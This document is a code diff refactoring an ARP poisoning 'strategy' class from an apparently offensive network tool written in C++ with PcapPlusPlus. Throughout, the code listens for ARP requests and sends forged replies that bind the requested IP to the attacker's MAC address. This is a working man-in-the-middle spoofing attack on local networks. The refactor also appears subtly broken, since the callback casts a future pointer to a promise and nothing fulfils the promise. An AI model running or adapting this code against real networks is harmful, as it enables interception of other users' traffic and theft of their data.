@@ -8,18 +8,9 @@
 #include <future>
 #include <stdexcept>
 
-namespace {
-struct AllOutArpPoisoningCookie {
-    pcpp::MacAddress attackerMac;
-    std::promise<void> completionPromise;
-};
-
-constexpr int RESPONSE_PACKET_SIZE = 60;
-
-void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
-                     void *cookie) {
-    auto *allOutArpPoisoningCookie =
-        static_cast<AllOutArpPoisoningCookie *>(cookie);
+void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
+    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
+    auto *completionFuture = static_cast<std::promise<void> *>(cookie);
 
     pcpp::Packet parsedPacket(packet);
     auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
@@ -27,8 +18,7 @@ void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
 
     // determine whether or not to handle packet
     if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
-         requestEthLayer->getSourceMac() ==
-             allOutArpPoisoningCookie->attackerMac) ||
+         requestEthLayer->getSourceMac() == attackerMac_) ||
         requestArpLayer->getTargetIpAddr() != device->getIPv4Address()) {
         return;
     }
@@ -37,19 +27,18 @@ void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
     pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                     requestEthLayer->getSourceMac());
 
-    pcpp::ArpLayer responseArpLayer(
-        pcpp::ArpOpcode::ARP_REPLY, allOutArpPoisoningCookie->attackerMac,
-        requestArpLayer->getSenderMacAddress(),
-        requestArpLayer->getTargetIpAddr(), requestArpLayer->getSenderIpAddr());
+    pcpp::ArpLayer responseArpLayer(pcpp::ArpOpcode::ARP_REPLY, attackerMac_,
+                                    requestArpLayer->getSenderMacAddress(),
+                                    requestArpLayer->getTargetIpAddr(),
+                                    requestArpLayer->getSenderIpAddr());
 
-    pcpp::Packet responsePacket(RESPONSE_PACKET_SIZE);
+    pcpp::Packet responsePacket(ARP_PACKET_SIZE);
     responsePacket.addLayer(&responseEthLayer);
     responsePacket.addLayer(&responseArpLayer);
     responsePacket.computeCalculateFields();
 
     device->sendPacket(&responsePacket);
 }
-} // namespace
 
 void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
     if (!device_->open()) {
@@ -58,14 +47,13 @@ void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
     std::promise<void> completionPromise;
     std::future completionFuture = completionPromise.get_future();
 
-    AllOutArpPoisoningCookie cookie{.attackerMac = attackerMac_,
-                                    .completionPromise =
-                                        std::move(completionPromise)};
-
     pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
     device_->setFilter(arpFilter);
 
-    device_->startCapture(onPacketArrives, &cookie);
+    device_->startCapture(
+        [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev,
+               void *userData) { onPacketArrives(packet, dev, userData); },
+        &completionFuture);
 
     completionFuture.wait();
 
